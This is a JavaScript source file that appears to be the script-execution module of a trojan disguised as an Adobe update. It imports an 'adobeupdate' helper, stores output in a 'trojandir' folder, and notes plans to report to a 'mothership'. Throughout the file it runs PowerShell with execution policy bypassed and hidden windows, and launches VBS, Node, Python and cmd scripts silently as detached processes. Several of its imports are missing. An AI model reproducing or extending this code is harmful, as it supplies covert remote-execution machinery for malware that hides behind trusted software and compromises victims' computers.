const helper = require("./adobeupdate.helper.js");

async function exec_ps_cmd(psScript) {
    return new Promise((resolve, reject) => {
        const child = spawn(
            "powershell.exe",
            [
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-NonInteractive",
                "-WindowStyle",
                "Hidden",
                "-Command",
                "-",
            ],
            { stdio: ["pipe", "pipe", "pipe"] }
        );

        let stdoutData = "";
        let stderrData = "";

        child.stdout.on("data", (chunk) => {
            stdoutData += chunk.toString();
        });

        child.stderr.on("data", (chunk) => {
            stderrData += chunk.toString();
        });

        child.on("error", (err) => {
            reject(err);
        });

        child.on("close", (code) => {
            if (code !== 0) {
                reject(
                    new Error(
                        `PowerShell exited with code ${code}: ${stderrData}`
                    )
                );
            } else {
                resolve(stdoutData.trim());
            }
        });

        child.stdin.write(psScript);
        child.stdin.end();
    });
}

function execPSScript_async(
    scriptfpath,
    cmdlineargsarr,
    execopts
) {

    return new Promise((resolve) => {
        let childp = null;
        childp = execPSScript(scriptfpath,cmdlineargsarr,execopts,null,null, (code)=>{
            helper.logmsg(`child process exited with code ${code}`);
            resolve(childp);
        });
    });
}

function execPSScript(
    scriptfpath,
    cmdlineargsarr,
    execopts,
    stdoutfunc,
    stderrfunc,
    closefunc
) {
    helper.logmsg("starting");

    cmdlineargsarr = cmdlineargsarr || [];
    cmdlineargsarr = [
        "-WindowStyle",
        "Hidden",
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-File",
        scriptfpath,
        ...cmdlineargsarr,
    ];

    let cwd = path.dirname(scriptfpath);

    if (!execopts) {
        execopts = { cwd: cwd };
    }

    let child = spawn("powershell.exe", cmdlineargsarr, execopts);

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else helper.logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else helper.logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else helper.logmsg(`[J8R3] child process exited with code ${code}`);
    });

    child.unref();

    // CommandLine
    // Name
    // ProcessId

    let spawnargsstr = JSON.stringify(child.spawnargs);
    let childpidstr = child.pid;

    helper.logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);

    return child;
}

function execVBSScript(scriptfpath, cmdlineargsarr) {
    helper.logmsg("starting");

    let enginename = "VBS";
    let tmpcode = getRandomCode(8);

    let stdoutfpath = path.join(
        systemconfig.trojandir,
        `exec${enginename}script_${tmpcode}.out`
    );

    let stderrfpath = path.join(
        systemconfig.trojandir,
        `exec${enginename}script_${tmpcode}.out`
    );

    const out = fs.openSync(stdoutfpath, "a");
    const err = fs.openSync(stderrfpath, "a");

    cmdlineargsarr = cmdlineargsarr ?? [];

    helper.logmsg(
        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
    );

    const child = spawn(
        "cscript",
        ["//E:vbscript", "//B", "//nologo", scriptfpath, ...cmdlineargsarr],
        {
            // detached: true, // might cause errors
            windowsHide: true,
            // shell: false,
            cwd: systemconfig.trojandir,
        }
    );

    child.stdout.on("data", (data) => {
        let str = Buffer.from(data).toString("utf-8");
        fs.writeSync(out, str);

        helper.logmsg(`STDOUT: ${data.toString()}`);

        // TODO: log to mothership
    });

    child.stderr.on("data", (data) => {
        let str = Buffer.from(data).toString("utf-8");
        fs.writeSync(err, str);

        helper.logmsg(`STDERR: ${str}`);

        // TODO: log to mothership
    });

    child.on("close", (code) => {
        helper.logmsg(`Process complete. Exit code: ${code}`);

        // TODO: log to mothership
    });

    child.unref();

    // CommandLine
    // Name
    // ProcessId

    let spawnargsstr = JSON.stringify(child.spawnargs);
    let childpidstr = child.pid;

    helper.logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);

    helper.logmsg("finished");

    return child;
}

function execNODEScript(scriptfpath, cmdlineargsarr) {
    helper.logmsg("starting");

    let enginename = "NODE";
    let tmpcode = getRandomCode(8);

    let stdoutfpath = path.join(
        systemconfig.trojandir,
        `exec${enginename}script_${tmpcode}.out`
    );

    let stderrfpath = path.join(
        systemconfig.trojandir,
        `exec${enginename}script_${tmpcode}.out`
    );

    const out = fs.openSync(stdoutfpath, "a");
    const err = fs.openSync(stderrfpath, "a");

    cmdlineargsarr = cmdlineargsarr ?? [];

    helper.logmsg(
        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
    );

    const child = spawn("node", [scriptfpath, ...(cmdlineargsarr ?? [])], {
        // detached: true, // might cause errors
        windowsHide: true,
        shell: false,
        cwd: systemconfig.trojandir,
    });

    child.stdout.on("data", (data) => {
        let str = Buffer.from(data).toString("utf-8");
        fs.writeSync(out, str);

        helper.logmsg(`STDOUT: ${data.toString()}`);

        // TODO: log to mothership
    });

    child.stderr.on("data", (data) => {
        let str = Buffer.from(data).toString("utf-8");
        fs.writeSync(err, str);

        helper.logmsg(`STDERR: ${str}`);

        // TODO: log to mothership
    });

    child.on("close", (code) => {
        helper.logmsg(`Process complete. Exit code: ${code}`);

        // TODO: log to mothership
    });

    child.unref();

    // CommandLine
    // Name
    // ProcessId

    let spawnargsstr = JSON.stringify(child.spawnargs);
    let childpidstr = child.pid;

    helper.logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);

    helper.logmsg("finished");

    return child;
}

function execPYTHONScript(scriptfpath, cmdlineargsarr) {
    helper.logmsg("starting");

    let enginename = "PYTHON";
    let tmpcode = getRandomCode(8);

    let stdoutfpath = path.join(
        systemconfig.trojandir,
        `exec${enginename}script_${tmpcode}.out`
    );

    let stderrfpath = path.join(
        systemconfig.trojandir,
        `exec${enginename}script_${tmpcode}.out`
    );

    const out = fs.openSync(stdoutfpath, "a");
    const err = fs.openSync(stderrfpath, "a");

    cmdlineargsarr = cmdlineargsarr ?? [];

    helper.logmsg(
        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
    );

    const child = spawn(
        "python",
        ["-u", scriptfpath, ...(cmdlineargsarr ?? [])],
        {
            // detached: true, // might cause errors
            windowsHide: true,
            shell: false,
            cwd: systemconfig.trojandir,
        }
    );

    child.stdout.on("data", (data) => {
        let str = Buffer.from(data).toString("utf-8");
        fs.writeSync(out, str);

        helper.logmsg(`STDOUT: ${data.toString()}`);

        // TODO: log to mothership
    });

    child.stderr.on("data", (data) => {
        let str = Buffer.from(data).toString("utf-8");
        fs.writeSync(err, str);

        helper.logmsg(`STDERR: ${str}`);

        // TODO: log to mothership
    });

    child.on("close", (code) => {
        helper.logmsg(`Process complete. Exit code: ${code}`);

        // TODO: log to mothership
    });

    child.unref();

    // CommandLine
    // Name
    // ProcessId

    let spawnargsstr = JSON.stringify(child.spawnargs);
    let childpidstr = child.pid;

    helper.logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);

    helper.logmsg("finished");

    return child;
}

function execCMDScript(scriptfpath, cmdlineargsarr) {
    helper.logmsg("starting");

    let tmpcode = getRandomCode(8);

    let stdoutfpath = path.join(
        systemconfig.trojandir,
        "execCMDScript_" + tmpcode + ".out"
    );
    let stderrfpath = path.join(
        systemconfig.trojandir,
        "execCMDScript_" + tmpcode + ".err"
    );

    const out = fs.openSync(stdoutfpath, "a");
    const err = fs.openSync(stderrfpath, "a");

    cmdlineargsarr = cmdlineargsarr ?? [];

    helper.logmsg(
        "spawning process: " +
        scriptfpath +
        " cmdlineargsarr: " +
        cmdlineargsarr.join()
    );

    const child = spawn(
        "cmd.exe",
        ["/c", scriptfpath, ...(cmdlineargsarr ?? [])],
        {
            // detached: true, // might cause errors
            windowsHide: true,
            stdio: ["ignore", out, err],
            shell: false,
            cwd: systemconfig.trojandir,
        }
    );

    child.unref();

    // CommandLine
    // Name
    // ProcessId

    helper.logmsg(
        `launched child pid=${child.pid} spawn args: ` +
        JSON.stringify(child.spawnargs)
    );

    helper.logmsg("finished");

    return child;
}
